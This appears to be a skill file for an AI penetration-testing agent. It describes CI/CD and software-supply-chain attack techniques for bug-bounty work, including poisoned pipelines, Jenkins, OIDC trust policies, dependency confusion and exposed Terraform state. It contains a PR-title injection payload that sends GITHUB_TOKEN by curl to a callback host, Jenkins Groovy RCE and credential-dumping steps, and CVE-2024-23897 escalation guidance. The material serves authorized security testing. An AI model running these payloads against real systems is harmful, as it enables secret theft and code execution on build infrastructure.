---
name: cicd-and-supply-chain
description: CI/CD pipeline and software-supply-chain attack techniques -- exposed CI secrets, poisoned pipeline execution (direct/indirect), self-hosted runner compromise, dependency confusion, typosquatting/install-script abuse, unsigned build artifacts, lockfile drift, and IaC-credential leaks in git history. Converted from master-pentest-prompt.md Phase 38 (new -- not in the original 59-phase set, added from research into currently-uncovered high-value bounty classes). Use when a CI config, package ecosystem, or IaC setup is visible in scope.
---

# CI/CD pipeline & software supply chain

## When to use

A GitHub/GitLab/Jenkins/CircleCI pipeline config is visible (public repo,
a leaked `.github/workflows/*.yml`, an exposed CI dashboard), or a
package ecosystem (npm/pip/RubyGems/Maven/crates.io) is in play for the
target. This is a distinct, high-value attack surface from application
testing -- compromising the pipeline compromises everything it builds and
deploys.

## Exposed CI secrets

Workflow files that echo or log secrets into build output, secrets
passed to a workflow triggered by `pull_request_target` that also
checks out the PR head (a classic poisoned-pipeline-execution setup —
untrusted code runs with privileged secret access), and third-party
Actions pinned by a mutable tag instead of a commit SHA (a supply-chain
takeover risk if that tag is ever repointed upstream).

## Jenkins script-console RCE and CVE-2024-23897

Jenkins is a distinct high-value target beyond generic pipeline config
exposure. An unauthenticated `/script` or `/scriptText` endpoint
accepts arbitrary Groovy and returns its output directly — confirm
real access by POSTing `script=println "id".execute().text` to
`/scriptText` and checking the response is actual command output
(`uid=...`), not a login page; a reachable URL that returns Jenkins'
login HTML or a `403` is not an unauthenticated console and isn't a
finding on its own. Once confirmed, the same Groovy access can dump
the credential store directly
(`CredentialsProvider.lookupCredentials(...)` against
`jenkins.model.Jenkins.instance`), since the UI's masking doesn't
apply to a script pulling the underlying objects. Separately,
**CVE-2024-23897** is a pre-auth arbitrary file read via the Jenkins
CLI's args4j argument parser: any CLI command argument prefixed with
`@` is expanded as a file path (`@/etc/passwd`) and its contents
echoed back in the resulting error, affecting Jenkins <=2.441 / LTS
<=2.426.2. Escalate it to RCE by reading `secret.key` and
`secrets/master.key` to decrypt `credentials.xml` offline, or by
reading a user's `config.xml` for their API token. Validate against
real leaked file content, not a generic "no such agent" error — that
means patched or wrong path, not a finding.

## Poisoned Pipeline Execution (PPE)

A workflow that runs untrusted code — a PR's own scripts or tests — with
access to repo secrets or write permissions. Direct PPE: attacker code
runs directly inside the privileged job. Indirect PPE: attacker-controlled
code runs via a config file or script the pipeline reads and trusts
without running it directly in the job definition.

## Malicious-PR payload pattern ("Pwnrequest")

The concrete way to weaponize a confirmed `pull_request_target` PPE
candidate: there are two distinct sink types in a vulnerable workflow,
and they take different payloads. Where an untrusted
`${{ github.event.pull_request.title }}`-style expression is
substituted directly into a shell `run:` step, the substitution
happens *before* the shell runs, so a PR title containing a
quote-break and a command (e.g.
`a"; printenv GITHUB_TOKEN | base64 | curl "https://<collab>/?t=$(cat)"; echo "`)
becomes literal shell once expanded. Where the workflow instead checks
out the PR head and runs a build step (`npm ci`, `make`, a repo
Makefile) without any `${{ }}` in the shell at all, the attacker
doesn't need template injection — dropping a payload into a
`package.json` `preinstall`/`postinstall` hook or a Makefile target
that the pipeline invokes runs attacker code directly on the runner
with whatever secrets that job holds. Either way, exfiltrate the
token/secrets with `printenv`/`/proc/self/environ`, never
`cat $GITHUB_TOKEN` — that opens a file *named* by the token's value
and returns nothing. Static-analyze candidates with
`zizmor`/`actionlint` before opening any PR, and confirm a blind sink
via a Collaborator/interactsh callback rather than inferring success
from a green run.

## Runner compromise

A self-hosted runner (`runs-on: self-hosted`) that also accepts jobs
triggered by `pull_request` from forks is effectively an open RCE
target — any fork's PR can execute arbitrary code on that runner.

## OIDC trust-policy abuse

Where a workflow uses `configure-aws-credentials` (or equivalent) to
assume a cloud role via OIDC federation instead of a static key, the
security of that path rests entirely on the role's trust policy, not
on the workflow itself. Pull the trust policy
(`aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'`)
and check the `token.actions.githubusercontent.com:sub` condition: a
missing `sub` condition (only `aud` checked), or a `StringLike`
wildcard like `repo:ORG/*:*`, lets *any* workflow anywhere in the org
assume that role — including one on a repo or branch that was never
meant to have that privilege. A tightly scoped policy pins `sub` to an
exact `repo:ORG/REPO:ref:refs/heads/main` (or an explicit environment
claim). Don't report a loose trust policy as impact on its own — prove
it by assuming the role from a workflow you actually control in-org
and returning the privileged role ARN via
`aws sts get-caller-identity`.

## GitHub-org-wide dependency inventory

Before checking any single package name for dependency confusion,
build the full inventory across the org rather than guessing at
internal scopes one at a time: enumerate every public repo
(`gh repo list ORG --limit 100 --json name`), then pull each repo's
manifest (`package.json`, `requirements.txt`, `go.mod`, `pom.xml`) via
the contents API and extract every dependency name
(`gh api repos/ORG/REPO/contents/package.json --jq '.content' | base64 -d | jq -r '.dependencies // {} | keys[]'`).
Scoped names matching the org's own brand (`@org-internal/...`) are
the dependency-confusion candidates; the rest of the inventory is
still useful for cross-referencing known-CVE versions against a
lockfile later. This is the recon step that feeds both the confusion
check below and general known-vulnerability chaining — do it once
across the whole org rather than per-repo as findings come up.

## Dependency confusion

An internal/private package name that doesn't exist on the public
registry — publishing that exact name publicly causes a misconfigured
internal build to pull the attacker's version instead of the intended
internal one, when the private registry isn't correctly prioritized in
the build's resolution order. Applies to npm, pip, and any
internal-scoped-package configuration.

## Typosquatting & install-script abuse

A malicious package with a name close to a popular one, relying on
`postinstall`/`preinstall` scripts (npm) or `setup.py` (pip) executing
unsandboxed code at install time — no application vulnerability
required, just someone running `npm install`/`pip install`.

## Typosquat and dependency-confusion candidate generation

For each internal-looking name surfaced by the inventory above, or
each external dependency the target actually uses, generate variant
names programmatically rather than guessing a handful by hand —
single-character deletions and adjacent-character transpositions cover
most real-world typosquats (a short loop producing `name[:i]+name[i+1:]`
for every index, plus the adjacent-swap form, is enough to generate
the candidate set for a given package name). Then check each
candidate's claim status directly against the registry: an HTTP
`HEAD` to `https://registry.npmjs.org/<name>` (npm),
`https://pypi.org/project/<name>/` (PyPI), or
`https://rubygems.org/api/v1/gems/<name>.json` returning `404` means
the name is unclaimed and registerable. An unclaimed name alone is
informational, not a finding — dependency confusion additionally
requires evidence the target's build actually resolves that name from
the public registry (no `.npmrc` scope-to-registry mapping, or a
resolution order that falls through to public npm) and that the name
is actually referenced in a real manifest, not just dead code. Never
publish to the unclaimed name to prove it — that's an attack on the
wider ecosystem and needs separate, explicit written sign-off; the
deliverable here is the candidate list plus the build-resolution
evidence, not a live PoC package.

## Artifact and build-output tampering

A build artifact published to a registry with no cryptographic
signing/provenance (SLSA) attached — anything downstream that trusts
that artifact blindly is a supply-chain target once the registry or
publish credentials are compromised.

## Lockfile / manifest drift

A lockfile pinning a version with a known CVE that the manifest alone
wouldn't reveal — always check the actual lockfile (`package-lock.json`,
`poetry.lock`, `Gemfile.lock`), not just the top-level manifest, since
the manifest's version range can hide an outdated resolved version.

## IaC credential exposure

Terraform state files, Ansible vault files, or Helm values committed
with plaintext credentials. Grep the full `.git` history, not just the
current HEAD — a secret removed in a later commit still exists in every
prior commit that included it.

## Probing for exposed Terraform state files

Beyond credentials committed to git history, a live `.tfstate` file
served directly over HTTP from a misconfigured backend is a separate,
common exposure — probe common bucket/path conventions directly
(`https://<org>.s3.amazonaws.com/terraform.tfstate`,
`https://storage.googleapis.com/<org>-tfstate/default.tfstate`,
`https://<org>.blob.core.windows.net/tfstate/terraform.tfstate`), and
search source for backend config disclosure
(`gh search code --owner ORG 'backend "s3"'`). A `200` alone isn't the
finding — `.tfstate` JSON commonly contains only resource
IDs/ARNs/tags with no live credential. Parse
`resources[].instances[].attributes` and filter for keys matching
`password|secret|private_key|token|access_key` before claiming
exposure, then prove impact with a read-only use of whatever
credential turns up (`aws sts get-caller-identity`, a DB connection
that returns a banner) rather than reporting "creds in state" from the
key names alone.
